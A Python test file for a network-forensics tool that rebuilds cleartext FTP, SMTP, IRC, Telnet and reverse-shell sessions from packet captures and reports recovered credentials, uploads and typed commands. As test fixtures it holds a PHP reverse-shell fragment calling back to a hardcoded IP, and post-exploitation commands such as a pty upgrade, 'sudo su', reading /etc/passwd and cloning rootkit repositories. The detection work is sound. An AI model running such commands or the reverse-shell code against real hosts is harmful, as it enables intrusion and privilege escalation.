"""
Tests for cleartext session recovery.

Each session is built as real TCP segments with sequence numbers and payloads,
in both directions, and reassembled by the accumulator exactly as it reassembles
a capture. The scenarios are the ones a cleartext capture is investigated for: an
FTP login and upload, and an interactive shell whose commands are readable on the
wire. Every value here is invented for the test; nothing is reproduced from a
real tool.
"""

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6

from packetiq.detection import cleartext as mod
from packetiq.detection.models import EventType, Severity

ATTACKER = "10.0.0.9"
VICTIM = "10.0.0.5"


# ── building streams ──────────────────────────────────────────────────────────

def _segments(src, sport, dst, dport, chunks, *, start_seq=1000, ts=0.0):
    """A sequence of TCP segments carrying `chunks` in order, one packet each."""
    packets = []
    seq = start_seq
    for i, chunk in enumerate(chunks):
        data = chunk if isinstance(chunk, bytes) else chunk.encode()
        pkt = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=seq) / data
        pkt = IP(bytes(pkt))
        pkt.time = ts + i
        packets.append(pkt)
        seq += len(data)
    return packets


def _run(packets):
    acc = mod.ClearTextAccumulator()
    for pkt in packets:
        acc.feed(pkt)
    events = acc.finalize()
    return acc, events


# ── FTP ───────────────────────────────────────────────────────────────────────

def _ftp_session(user="bob", password="s3cret", *, logged_in=True, uploaded=None,
                 working_dir="/var/www/html", sport=40000):
    commands = [f"USER {user}\r\n", f"PASS {password}\r\n"]
    responses = ["220 Hello\r\n", "331 Please specify the password.\r\n"]
    if logged_in:
        responses.append("230 Login successful.\r\n")
        commands.append("PWD\r\n")
        responses.append(f'257 "{working_dir}" is the current directory\r\n')
        if uploaded:
            commands.append(f"STOR {uploaded}\r\n")
            responses.append("150 Ok to send data.\r\n226 Transfer complete.\r\n")
    else:
        responses.append("530 Login incorrect.\r\n")
    return (_segments(ATTACKER, sport, VICTIM, 21, commands)
            + _segments(VICTIM, 21, ATTACKER, sport, responses))


def test_an_ftp_login_recovers_the_username_and_the_password():
    """The password is sent in clear text, so the tool reads it rather than redacting it."""
    acc, events = _run(_ftp_session("bob", "s3cret"))
    creds = acc.summary()["valid_credentials"]
    assert len(creds) == 1
    assert creds[0]["username"] == "bob"
    assert creds[0]["password"] == "s3cret"
    assert creds[0]["result"] == "login successful"

    cred_events = [e for e in events if e.event_type is EventType.CREDENTIAL_EXPOSURE]
    assert len(cred_events) == 1
    assert cred_events[0].severity is Severity.CRITICAL
    assert "s3cret" in cred_events[0].description


def test_a_failed_login_is_not_raised_as_a_recovered_credential():
    """A wrong guess is brute-force noise, not a credential to rotate."""
    acc, events = _run(_ftp_session("bob", "wrongpass", logged_in=False))
    assert acc.summary()["valid_credentials"] == []
    assert [e for e in events if e.event_type is EventType.CREDENTIAL_EXPOSURE] == []


def test_a_password_spray_is_collapsed_to_the_login_that_worked():
    """Many connections, one working credential: the password is not buried."""
    packets = []
    for i, pw in enumerate(["aaa", "bbb", "ccc"]):
        packets += _ftp_session("bob", pw, logged_in=False, sport=40000 + i)
    packets += _ftp_session("bob", "winner", logged_in=True, sport=40100)
    acc, events = _run(packets)

    s = acc.summary()
    assert [c["password"] for c in s["valid_credentials"]] == ["winner"]
    assert s["failed_password_attempts"] == 3
    assert len([e for e in events if e.event_type is EventType.CREDENTIAL_EXPOSURE]) == 1


def test_the_ftp_working_directory_is_read_from_the_257_reply():
    """What is the working directory after login: straight from the PWD response."""
    acc, _ = _run(_ftp_session(working_dir="/home/bob/public"))
    ftp = acc.summary()["ftp_sessions"][0]
    assert ftp["working_directory"] == "/home/bob/public"


def test_an_ftp_upload_recovers_the_filename_and_raises_a_transfer_finding():
    acc, events = _run(_ftp_session(uploaded="backdoor.php"))
    ftp = acc.summary()["ftp_sessions"][0]
    assert ftp["uploaded"] == ["backdoor.php"]

    transfer = [e for e in events if e.event_type is EventType.SUSPICIOUS_FILE_TRANSFER]
    assert len(transfer) == 1
    assert transfer[0].severity is Severity.HIGH
    assert "backdoor.php" in transfer[0].description


def test_a_download_is_recorded_as_a_download_not_an_upload():
    commands = ["USER bob\r\n", "PASS s3cret\r\n", "RETR secrets.zip\r\n"]
    responses = ["220 hi\r\n", "331 pw\r\n", "230 Login successful.\r\n",
                 "150 ok\r\n226 done\r\n"]
    acc, _ = _run(_segments(ATTACKER, 40000, VICTIM, 21, commands)
                  + _segments(VICTIM, 21, ATTACKER, 40000, responses))
    ftp = acc.summary()["ftp_sessions"][0]
    assert ftp["downloaded"] == ["secrets.zip"]
    assert ftp["uploaded"] == []


# ── carving indicators out of an uploaded file ────────────────────────────────

def test_indicators_are_carved_from_an_uploaded_script_without_the_body():
    """A dropped reverse shell hardcodes where it calls back and where it came from."""
    script = (b"<?php\n// a reverse shell\n$ip = '10.0.0.9';\n$port = 4444;\n"
              b"// see https://example.test/tools/revshell for details\n"
              b"$sock = fsockopen($ip, $port);\n?>\n") + b"A" * 80
    # Uploaded over an FTP data connection (a high ephemeral port, not 21).
    acc, _ = _run(_segments(ATTACKER, 50000, VICTIM, 50001, [script]))
    uploads = acc.summary()["uploaded_files"]
    assert len(uploads) == 1
    assert uploads[0]["kind"] == "PHP reverse shell"
    assert "https://example.test/tools/revshell" in uploads[0]["urls"]
    assert "10.0.0.9" in uploads[0]["callbacks"]


def test_a_plain_data_transfer_is_not_mistaken_for_a_script():
    """Only something that begins with a script marker is carved for indicators."""
    acc, _ = _run(_segments(ATTACKER, 50000, VICTIM, 50001,
                            [b"just some file bytes with https://example.test inside " * 4]))
    assert acc.summary() == {} or acc.summary().get("uploaded_files", []) == []


# ── interactive shell ─────────────────────────────────────────────────────────

def _shell_session(commands_typed, output_lines, *, sport=53734, cport=4444):
    """A reverse shell: victim->attacker carries output, attacker->victim the commands."""
    output = _segments(VICTIM, sport, ATTACKER, cport, output_lines)
    typed = _segments(ATTACKER, cport, VICTIM, sport, commands_typed)
    # interleave by time so neither side is purely first
    return output + typed


def test_an_interactive_shell_recovers_the_commands_the_attacker_typed():
    output = ["Linux target01 5.4.0 x86_64 GNU/Linux\n",
              "uid=33(www-data) gid=33(www-data)\n", "$ ", "www-data\n", "$ "]
    typed = ["whoami\n", "uname -a\n", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"]
    acc, events = _run(_shell_session(typed, output))

    shell = acc.summary()["shell_sessions"][0]
    assert "whoami" in shell["commands"]
    assert any("pty.spawn" in c for c in shell["commands"])
    assert shell["hostname"] == "target01"

    shell_events = [e for e in events if e.event_type is EventType.REVERSE_SHELL]
    assert len(shell_events) == 1
    assert shell_events[0].severity is Severity.CRITICAL


def test_a_shell_session_detects_the_escalation_to_root():
    output = ["user@target01:/$ ", "root@target01:/# ", "uid=0(root)\n"]
    typed = ["sudo su\n", "whoami\n"]
    acc, _ = _run(_shell_session(typed, output))
    shell = acc.summary()["shell_sessions"][0]
    assert shell["became_root"] is True
    assert "sudo su" in shell["commands"]


def test_a_github_project_fetched_in_the_shell_is_named():
    output = ["root@target01:~# ", "Cloning into 'Tooling'...\n"]
    typed = ["git clone https://github.com/someone/Tooling.git\n"]
    acc, _ = _run(_shell_session(typed, output))
    shell = acc.summary()["shell_sessions"][0]
    assert "someone/Tooling" in shell["github_projects"]
    assert any("github.com/someone/Tooling" in u for u in shell["urls"])


def test_a_plain_data_stream_is_not_mistaken_for_a_shell():
    """A file transfer or HTTP body has no prompts and no shell commands."""
    acc, _ = _run(_segments(ATTACKER, 50000, VICTIM, 8080,
                            [b"GET /index.html HTTP/1.1\r\nHost: x\r\n\r\n"]))
    assert acc.summary().get("shell_sessions", []) == []


def test_the_hostname_is_read_from_a_prompt_when_there_is_no_uname():
    output = ["admin@webserver:/var/www# ", "total 0\n"]
    typed = ["ls -la\n", "cat /etc/passwd\n"]
    acc, _ = _run(_shell_session(typed, output))
    assert acc.summary()["shell_sessions"][0]["hostname"] == "webserver"


# ── intake and reassembly ─────────────────────────────────────────────────────

def test_segments_are_ordered_by_sequence_number_not_arrival():
    """Out-of-order arrival must still reassemble the right command stream."""
    a = IP(src=ATTACKER, dst=VICTIM) / TCP(sport=40000, dport=21, flags="PA", seq=1000) / b"USER "
    b = IP(src=ATTACKER, dst=VICTIM) / TCP(sport=40000, dport=21, flags="PA", seq=1005) / b"bob\r\n"
    c = IP(src=ATTACKER, dst=VICTIM) / TCP(sport=40000, dport=21, flags="PA", seq=1009) / b"PASS pw\r\n"
    resp = _segments(VICTIM, 21, ATTACKER, 40000, ["220 hi\r\n331 pw\r\n230 Login successful.\r\n"])
    # feed the command segments out of order
    acc, _ = _run([IP(bytes(b)), IP(bytes(c)), IP(bytes(a))] + resp)
    assert acc.summary()["valid_credentials"][0]["username"] == "bob"


def test_a_retransmitted_segment_is_counted_once():
    dup = IP(src=ATTACKER, dst=VICTIM) / TCP(sport=40000, dport=21, flags="PA", seq=1000) / b"USER bob\r\n"
    acc, _ = _run([IP(bytes(dup)), IP(bytes(dup))]
                  + _segments(ATTACKER, 40000, VICTIM, 21, ["PASS pw\r\n"], start_seq=1010)
                  + _segments(VICTIM, 21, ATTACKER, 40000, ["220\r\n331\r\n230 Login successful.\r\n"]))
    ftp = acc.summary()["ftp_sessions"][0]
    assert ftp["commands"].count("USER bob") == 1


def test_a_packet_with_no_payload_is_ignored():
    bare = IP(src=ATTACKER, dst=VICTIM) / TCP(sport=40000, dport=21, flags="A", seq=1000)
    acc, _ = _run([IP(bytes(bare))])
    assert acc.summary() == {}


def test_non_tcp_traffic_is_ignored():
    acc, _ = _run([IP(src=ATTACKER, dst=VICTIM) / UDP(dport=53) / b"dns"])
    assert acc.summary() == {}


def test_a_packet_with_no_ip_layer_is_skipped():
    bare = TCP(sport=40000, dport=21, flags="PA", seq=1000) / b"USER bob\r\n"
    acc, _ = _run([TCP(bytes(bare))])
    assert acc.summary() == {}


def test_cleartext_over_ipv6_is_read_the_same_as_over_ipv4():
    cmd = IPv6(src="fd00::9", dst="fd00::5") / TCP(sport=40000, dport=21, flags="PA", seq=1000) \
        / b"USER bob\r\nPASS s3cret\r\n"
    resp = IPv6(src="fd00::5", dst="fd00::9") / TCP(sport=21, dport=40000, flags="PA", seq=1) \
        / b"220\r\n331\r\n230 Login successful.\r\n"
    acc, _ = _run([IPv6(bytes(cmd)), IPv6(bytes(resp))])
    assert acc.summary()["valid_credentials"][0]["password"] == "s3cret"


def test_a_stream_is_capped_so_a_bulk_transfer_is_not_held_in_full():
    # Ten 60 KB segments is 600 KB, well past the cap; once the buffer reaches
    # the limit it stops accepting, so the whole transfer is never held.
    fed = 10 * 60000
    big = _segments(ATTACKER, 50000, VICTIM, 50001, [b"A" * 60000] * 10)
    acc, _ = _run(big)
    stream = next(iter(acc.streams.values()))
    held = max(stream.sizes.values())
    assert held < fed
    assert held <= mod._MAX_STREAM_BYTES + 60000   # at most one segment past the cap


def test_endpoint_extraction_gives_up_quietly_on_a_packet_it_cannot_read():
    class Hostile:
        def haslayer(self, _layer):
            raise ValueError("not a packet")

    assert mod._endpoints(Hostile()) == (None, None)


# ── the summary the copilot and the report read ───────────────────────────────

def test_the_summary_is_empty_when_there_is_nothing_to_recover():
    assert mod.ClearTextAccumulator().summary() == {}


def test_the_summary_ties_the_whole_intrusion_together():
    """FTP creds, the upload, and the shell, as one investigation."""
    packets = _ftp_session("bob", "s3cret", uploaded="backdoor.php")
    packets += _shell_session(
        ["whoami\n", "sudo su\n", "git clone https://github.com/x/RootkitKit.git\n"],
        ["Linux target01 5.4.0\n", "root@target01:/# "])
    acc, _ = _run(packets)
    s = acc.summary()
    assert s["valid_credentials"][0]["password"] == "s3cret"
    assert s["ftp_sessions"][0]["uploaded"] == ["backdoor.php"]
    assert s["shell_sessions"][0]["became_root"] is True
    assert "x/RootkitKit" in s["shell_sessions"][0]["github_projects"]


# ── the defensive and edge paths, covered directly ────────────────────────────

def test_an_ftp_port_stream_with_no_login_and_no_responses_is_skipped():
    """A connection to port 21 that never sends USER and gets no reply is not a session."""
    acc, _ = _run(_segments(ATTACKER, 40000, VICTIM, 21, ["HELP\r\nNOOP\r\n"]))
    assert acc.summary().get("ftp_sessions", []) == []


def test_a_single_direction_shell_capture_still_recovers_commands():
    """Only one side of a shell was captured: commands and output are interleaved."""
    one_side = _segments(VICTIM, 53734, ATTACKER, 4444,
                         ["Linux host9 5.4.0\n$ whoami\nroot\n$ id\nuid=0(root)\n"])
    acc, _ = _run(one_side)
    shells = acc.summary().get("shell_sessions", [])
    assert shells and shells[0]["hostname"] == "host9"


def test_an_over_long_typed_line_is_skipped_not_recorded():
    """A 500-character blob is not a typed command; it is pasted data or noise."""
    long_line = "whoami " + "A" * 500 + "\n"
    acc, _ = _run(_shell_session([long_line, "id\n"],
                                 ["$ ", "uid=0(root)\n", "Linux h 5.4\n"]))
    shells = acc.summary().get("shell_sessions", [])
    if shells:
        assert all(len(c) <= 400 for c in shells[0]["commands"])


def test_a_script_with_no_indicators_inside_is_not_reported_as_an_upload():
    script = b"<?php\necho 'hello world, nothing to see here';\n?>\n" + b"x" * 80
    acc, _ = _run(_segments(ATTACKER, 50000, VICTIM, 50001, [script]))
    assert acc.summary().get("uploaded_files", []) == []


def test_the_same_working_credential_seen_twice_is_listed_once():
    """Two successful connections with the same login are one credential."""
    packets = (_ftp_session("bob", "s3cret", logged_in=True, sport=40000)
               + _ftp_session("bob", "s3cret", logged_in=True, sport=40001))
    acc, _ = _run(packets)
    creds = acc.summary()["valid_credentials"]
    assert len(creds) == 1
    assert creds[0]["password"] == "s3cret"


def test_a_blank_line_in_the_typed_stream_is_skipped():
    """Reassembled shell input has blank lines between commands; they are not commands."""
    # Output is the larger stream (so the short typed side is correctly identified).
    output = ["user@host:/$ " + "x" * 200 + "\n", "total\n", "uid=0\n", "Linux h 5.4\n"]
    typed = ["whoami\n\nid\n"]   # a blank line between the two commands
    acc, _ = _run(_shell_session(typed, output))
    shells = acc.summary().get("shell_sessions", [])
    assert shells
    assert "whoami" in shells[0]["commands"]


# ── reaching the analyst: the copilot context and the CLI section ─────────────

_FULL_SUMMARY = {
    "valid_credentials": [
        {"protocol": "FTP", "host": VICTIM, "username": "jenny",
         "password": "password123", "result": "login successful"}],
    "failed_password_attempts": 15,
    "ftp_sessions": [
        {"client": ATTACKER, "server": VICTIM, "username": "jenny",
         "password": "password123", "logged_in": True,
         "working_directory": "/var/www/html", "uploaded": ["shell.php"],
         "downloaded": [], "commands": []}],
    "uploaded_files": [
        {"from": ATTACKER, "to": VICTIM, "kind": "PHP reverse shell",
         "urls": ["http://example.test/tools/revshell"], "callbacks": [ATTACKER]}],
    "shell_sessions": [
        {"attacker": ATTACKER, "victim": VICTIM, "hostname": "wir3",
         "became_root": True,
         "commands": ["whoami", "sudo su", "git clone https://github.com/x/Reptile.git"],
         "urls": ["https://github.com/x/Reptile.git"],
         "github_projects": ["x/Reptile"]}],
}


def test_the_copilot_context_carries_every_recovered_fact():
    """The whole point: the model is handed the credential, the upload, and the
    shell transcript, so it can answer instead of saying 'not in this capture'."""
    from packetiq.copilot.context_builder import _cleartext_sessions
    from packetiq.extractor.data_extractor import ExtractionResult

    result = ExtractionResult()
    result.cleartext = _FULL_SUMMARY
    text = _cleartext_sessions(result)

    assert "RECOVERED CLEARTEXT SESSIONS" in text
    assert "password=password123" in text
    assert "/var/www/html" in text
    assert "shell.php" in text
    assert "http://example.test/tools/revshell" in text
    assert "hostname: wir3" in text
    assert "command 1: whoami" in text
    assert "GitHub project fetched: x/Reptile" in text
    assert "escalated to root" in text


def test_the_context_section_is_absent_without_cleartext():
    from packetiq.copilot.context_builder import _cleartext_sessions
    from packetiq.extractor.data_extractor import ExtractionResult

    assert _cleartext_sessions(ExtractionResult()) == ""


class _CapturingUI:
    def __init__(self):
        self.text = []

    def print_section(self, *a, **k):
        self.text.append(" ".join(str(x) for x in a))

    def print_table(self, title, **k):
        self.text.append(title + " " + repr(k.get("rows")))

    def print_status(self, msg, *a, **k):
        self.text.append(msg)

    @property
    def blob(self):
        return "\n".join(self.text)


def test_the_cli_section_shows_credentials_uploads_and_the_shell_transcript():
    from packetiq.cli import _print_cleartext_section

    ui = _CapturingUI()
    _print_cleartext_section(ui, _FULL_SUMMARY)
    assert "password123" in ui.blob
    assert "15 failed password attempt" in ui.blob
    assert "/var/www/html" in ui.blob
    assert "shell.php" in ui.blob
    assert "example.test/tools/revshell" in ui.blob
    assert "wir3" in ui.blob
    assert "whoami" in ui.blob
    assert "x/Reptile" in ui.blob


def test_the_cli_section_is_silent_without_cleartext():
    from packetiq.cli import _print_cleartext_section

    ui = _CapturingUI()
    _print_cleartext_section(ui, {})
    assert ui.text == []


def test_the_context_reports_a_download_as_well_as_an_upload():
    from packetiq.copilot.context_builder import _cleartext_sessions
    from packetiq.extractor.data_extractor import ExtractionResult

    result = ExtractionResult()
    result.cleartext = {
        "ftp_sessions": [
            {"client": ATTACKER, "server": VICTIM, "username": "bob",
             "password": "", "logged_in": True, "working_directory": "/srv",
             "uploaded": [], "downloaded": ["secrets.zip"], "commands": []}],
    }
    text = _cleartext_sessions(result)
    assert "files downloaded: secrets.zip" in text


# ── SMTP / IRC / Telnet conversation recovery ─────────────────────────────────

import base64  # noqa: E402


def test_an_smtp_email_envelope_and_subject_are_recovered():
    cmds = (b"EHLO me\r\nMAIL FROM:<alice@corp.test>\r\nRCPT TO:<bob@corp.test>\r\n"
            b"DATA\r\nSubject: Q4 numbers\r\n\r\nthe body text\r\n.\r\nQUIT\r\n")
    acc, _ = _run(_segments(ATTACKER, 40000, VICTIM, 25, [cmds]))
    em = acc.summary()["email_sessions"][0]
    assert em["mail_from"] == "alice@corp.test"
    assert "bob@corp.test" in em["recipients"]
    assert em["subject"] == "Q4 numbers"


def test_smtp_auth_login_credentials_are_decoded_and_raised():
    user = base64.b64encode(b"mailer").decode()
    pw = base64.b64encode(b"s3cret").decode()
    cmds = f"AUTH LOGIN\r\n{user}\r\n{pw}\r\nMAIL FROM:<a@b.test>\r\n".encode()
    acc, events = _run(_segments(ATTACKER, 40000, VICTIM, 25, [cmds]))
    creds = acc.summary()["valid_credentials"]
    assert any(c["protocol"] == "SMTP" and c["username"] == "mailer"
               and c["password"] == "s3cret" for c in creds)
    assert any(e.protocol == "SMTP" and e.dst_port == 25 for e in events
               if e.event_type is EventType.CREDENTIAL_EXPOSURE)


def test_smtp_auth_plain_credentials_are_decoded():
    blob = base64.b64encode(b"\x00mailer\x00s3cret").decode()
    acc, _ = _run(_segments(ATTACKER, 40000, VICTIM, 25, [f"AUTH PLAIN {blob}\r\n".encode()]))
    assert any(c["username"] == "mailer" and c["password"] == "s3cret"
               for c in acc.summary()["valid_credentials"])


def test_smtp_auth_helper_covers_every_branch():
    good = base64.b64encode(b"\x00u\x00p").decode().encode()
    assert mod._smtp_auth(b"AUTH PLAIN " + good) == ("u", "p")
    # decodes cleanly but too few \0 parts
    assert mod._smtp_auth(b"AUTH PLAIN " + base64.b64encode(b"nopart").decode().encode()) is None
    # matches the charset but an invalid base64 length → decode raises → None
    assert mod._smtp_auth(b"AUTH PLAIN QUJDE") is None
    u, pw = base64.b64encode(b"user").decode().encode(), base64.b64encode(b"pass").decode().encode()
    assert mod._smtp_auth(b"AUTH LOGIN\r\n" + u + b"\r\n" + pw + b"\r\n") == ("user", "pass")
    assert mod._smtp_auth(b"AUTH LOGIN\r\n" + u + b"\r\n") is None          # one token
    assert mod._smtp_auth(b"AUTH LOGIN\r\nQUJDE\r\nQUJDE\r\n") is None      # invalid tokens
    assert mod._smtp_auth(b"HELO nothing here") is None


def test_b64_text_helper():
    assert mod._b64_text(base64.b64encode(b"hi")) == "hi"
    assert mod._b64_text(b"QUJDE") is None


def test_an_irc_chat_with_messages_and_server_password_is_recovered():
    client = (b"PASS serverpw\r\nNICK h4x0r\r\nUSER h4x0r 0 * :real\r\n"
              b"JOIN #secret\r\nPRIVMSG #secret :the flag is THM{irc_flag}\r\n")
    server = b":srv 001 h4x0r :Welcome\r\n:other!u@h PRIVMSG #secret :hi there\r\n"
    acc, events = _run(_segments(ATTACKER, 40000, VICTIM, 6667, [client])
                       + _segments(VICTIM, 6667, ATTACKER, 40000, [server]))
    s = acc.summary()["irc_sessions"][0]
    assert s["nick"] == "h4x0r" and "#secret" in s["channels"]
    assert any("the flag is THM{irc_flag}" in m for m in s["messages"])
    assert any("hi there" in m for m in s["messages"])
    assert any(c["protocol"] == "IRC" and c["password"] == "serverpw"
               for c in acc.summary()["valid_credentials"])
    assert any(e.protocol == "IRC" and e.dst_port == 6667 for e in events
               if e.event_type is EventType.CREDENTIAL_EXPOSURE)


def test_a_telnet_login_is_recovered_through_the_iac_negotiation():
    server = b"\xff\xfb\x01Ubuntu 20.04 LTS\r\nlogin: admin\r\nPassword: \r\nWelcome\r\n"
    client = b"admin\r\ns3cretpw\r\n"
    acc, events = _run(_segments(VICTIM, 23, ATTACKER, 40000, [server])
                       + _segments(ATTACKER, 40000, VICTIM, 23, [client]))
    login = acc.summary()["telnet_logins"][0]
    assert login["username"] == "admin" and login["password"] == "s3cretpw"
    assert any(e.protocol == "TELNET" and e.dst_port == 23 for e in events
               if e.event_type is EventType.CREDENTIAL_EXPOSURE)


def test_strip_iac_removes_two_and_three_byte_sequences():
    data = b"\xff\xfb\x01login: \xff\xf1admin"
    assert mod._strip_iac(data) == b"login: admin"


def test_telnet_creds_with_no_login_prompt_returns_nothing():
    assert mod._telnet_creds(b"no prompt in here", b"typed stuff") == ("", "")


def test_a_telnet_session_without_a_password_prompt_has_no_password():
    server = b"login: guest\r\nWelcome, no password needed\r\n"
    client = b"guest\r\n"
    acc, _ = _run(_segments(VICTIM, 23, ATTACKER, 40000, [server])
                  + _segments(ATTACKER, 40000, VICTIM, 23, [client]))
    login = acc.summary()["telnet_logins"][0]
    assert login["username"] == "guest" and login["password"] == ""


# ── the new conversations in the context and the CLI ──────────────────────────

_CONVO_SUMMARY = {
    "email_sessions": [{"client": ATTACKER, "server": VICTIM,
                        "mail_from": "alice@corp.test", "recipients": ["bob@corp.test"],
                        "subject": "Q4 numbers", "username": "mailer"}],
    "irc_sessions": [{"client": ATTACKER, "server": VICTIM, "nick": "h4x0r",
                      "channels": ["#secret"], "messages": ["#secret: the plan is set"]}],
    "telnet_logins": [{"client": ATTACKER, "server": VICTIM,
                       "username": "admin", "password": "s3cretpw"}],
}


def test_the_context_renders_email_irc_and_telnet():
    from packetiq.copilot.context_builder import _cleartext_sessions
    from packetiq.extractor.data_extractor import ExtractionResult

    result = ExtractionResult()
    result.cleartext = _CONVO_SUMMARY
    text = _cleartext_sessions(result)
    assert "alice@corp.test" in text and "Q4 numbers" in text
    assert "h4x0r" in text and "the plan is set" in text
    assert "username=admin" in text and "password=s3cretpw" in text


def test_the_cli_renders_email_irc_and_telnet():
    from packetiq.cli import _print_cleartext_section

    ui = _CapturingUI()
    _print_cleartext_section(ui, _CONVO_SUMMARY)
    assert "alice@corp.test" in ui.blob and "Q4 numbers" in ui.blob
    assert "h4x0r" in ui.blob and "the plan is set" in ui.blob
    assert "admin" in ui.blob and "s3cretpw" in ui.blob


def test_a_port_25_stream_with_no_smtp_commands_is_skipped():
    acc, _ = _run(_segments(ATTACKER, 40000, VICTIM, 25, [b"random bytes, not smtp at all here"]))
    assert acc.summary().get("email_sessions", []) == []


def test_a_port_6667_stream_with_no_irc_commands_is_skipped():
    acc, _ = _run(_segments(ATTACKER, 40000, VICTIM, 6667, [b"just some data, no irc here at all"]))
    assert acc.summary().get("irc_sessions", []) == []


def test_a_telnet_stream_without_a_login_prompt_is_skipped():
    acc, _ = _run(_segments(VICTIM, 23, ATTACKER, 40000, [b"welcome, no prompt shown\r\n"])
                  + _segments(ATTACKER, 40000, VICTIM, 23, [b"hello\r\n"]))
    assert acc.summary().get("telnet_logins", []) == []


def test_a_telnet_login_prompt_with_no_recoverable_credential_is_skipped():
    server = b"login: \r\nMOTD text only, nothing typed\r\n"
    acc, _ = _run(_segments(VICTIM, 23, ATTACKER, 40000, [server])
                  + _segments(ATTACKER, 40000, VICTIM, 23, [b"\r\n"]))
    assert acc.summary().get("telnet_logins", []) == []
